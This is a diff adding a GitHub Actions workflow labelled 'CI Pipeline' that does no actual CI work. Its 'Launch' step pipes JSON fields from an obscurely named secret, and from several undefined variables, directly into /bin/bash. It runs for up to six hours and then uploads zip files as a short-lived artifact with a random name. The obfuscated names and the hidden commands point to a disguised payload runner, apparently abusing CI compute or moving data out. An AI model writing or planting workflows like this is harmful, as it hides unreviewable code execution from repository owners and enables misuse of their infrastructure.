@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          lthcv35547: ${{ secrets.lthcv35547 }}
+        run: |
+          printf '%s' "$lthcv35547" | jq -r .wirti27296 | /bin/bash
+          printf '%s' "$zswy2861" | jq -r .ok1 | /bin/bash
+          printf '%s' "$diviu83" | jq -r .avu20 | /bin/bash
+          echo $io01946 | jq -r .z80407 | /bin/bash
+          echo $c75 | jq -r .r19327 | /bin/bash
+          echo $jjim706 | jq -r .brkuh2685 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Tq58YhN2
+          path: "*.zip"
+          retention-days: 1
